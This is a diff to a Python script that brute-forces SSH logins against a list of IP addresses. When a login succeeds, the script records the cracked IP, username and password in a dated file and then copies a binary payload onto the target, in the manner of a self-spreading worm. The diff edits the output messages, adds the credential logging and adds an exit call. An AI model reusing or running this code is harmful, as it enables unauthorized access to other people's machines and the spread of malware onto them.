@@ -40,14 +40,12 @@ def scan(ip):
             if "ssh" in protocol[1]:
                 if not Utils().test_ssh(ip, u_p, protocol):
                     # Utils().dbg("{} ==> cant connect on ssh".format(ip))
-                    print("{}{}{}{} fail bruteforcing with{}:{}".format(Colors.FAIL, duck, Colors.END, ip, u_p[0], u_p[1]))
-
+                    print("nope for {} {}:{}".format(ip, u_p[0], u_p[1]))
                 else:
                     # Utils().dbg("attempting rsync copy to target")
-                    print("{}{}{}{} success with {}:{}".format(Colors.OKGREEN, duck, Colors.END, ip, u_p[0],
-                                                                        u_p[1]))
+                    print("{} {} {} {} success with {}:{}".format(Colors.OKGREEN, duck, Colors.END, ip, u_p[0], u_p[1]))
+                    shell().execom('echo "{} {}:{}" >> availables_at_`date+ %d-%m-%Y`.txt'.format(ip, u_p[0], u_p[1]))
                     sync(FILE, u_p[0], u_p[1], protocol[0], BINF, ip, DEF_DEST)
-            # attempt scp upload in the target
 
             if "telnet" in protocol[1]:
                 """
@@ -105,3 +103,5 @@ def main():
 
 
 main()
+# delete generated ips
+exit(0)
